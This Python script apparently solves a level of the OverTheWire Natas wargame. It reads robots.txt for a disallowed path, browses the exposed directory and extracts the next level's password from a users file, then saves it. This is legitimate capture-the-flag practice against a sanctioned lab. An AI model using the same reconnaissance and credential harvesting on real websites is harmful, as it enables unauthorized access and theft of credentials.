import os
import requests

from bs4 import BeautifulSoup, Tag

from bs4 import ResultSet

import pathlib

file = os.path.basename(__file__).split(".")
file = file[0]
file = file[file.find("natas")+5:]

level = int(file)

username = f"natas{level}"
password = None
website = f"http://{username}.natas.labs.overthewire.org/"

result = None

with open(f"./natas/password/natas{level:02}-password.txt", "r") as f:
    password = f.read()

def natas_connect(website: str, username: str = None, password: str = None, params: dict = None, get_body: bool = True) -> Tag:
    print(f"Connecting to {website}")
    
    if username and password:
        print(f"Username : {username}")
    
    if username and password:
        print(f"Password : {password}")
    
    print()

    r = requests.get(website, auth=(username, password), params=params)

    print("Parsing HTML", end="...")
    soup = BeautifulSoup(r.content, "html.parser")
    print("Done\n")

    if get_body:
        print("Retrieving <body> tag", end="...")
        body = soup.find("body")
        print("Done\n")
    else:
        body = soup


    print(body)
    print()

    return body

def save_password(result: str, level: int = level) -> pathlib.Path:
    result = result.strip("\n")

    print(f"Password found : {result}\n")

    dir = f"./natas/password/natas{level+1:02}-password.txt"

    print(f"Saving to file {dir}", end="...")
    with open(dir, "w+") as f:
        f.write(result or "")
    print("Done")

    print()

    return pathlib.Path(dir)

def join_website_dir(website: str, *dir: str) -> str:
    dir = map(str, dir)

    res = website.strip("/")

    for d in dir:
        res += "/"
        res += d.strip("/")

    return res

def find_element(element: str, soup: BeautifulSoup | Tag , all: bool = True) -> Tag:
    print(f"Finding <{element}>", end="...")
    res = soup.find(element)
    print("Done\n")
    
    return res

body = natas_connect(website=website, username=username, password=password)

soup = natas_connect(website=join_website_dir(website, "robots.txt"), username=username, password=password, get_body=False)

content = soup.get_text()
content = content.splitlines()
content = [c.split(": ") for c in content]

params = {k: v for k, v in content}

secret = params["Disallow"]

body = natas_connect(website=join_website_dir(website, secret), username=username, password=password)

print("Finding table cells", end="...")
td : ResultSet[Tag] = body.find_all("td")
print("Done\n")

print("Finding links in table cells", end="...")
links = [e.findChild("a") for e in td]
links = [*filter(lambda e: e, links)]
links = [e.attrs["href"] for e in links if e]
print("Done\n")

users = links[-1]

soup = natas_connect(website=join_website_dir(website, secret, users), username=username, password=password, get_body=False)

content = soup.get_text()
content = dict([content.split(":")])

result = content[f"natas{level+1}"]

password_dir = save_password(result=result)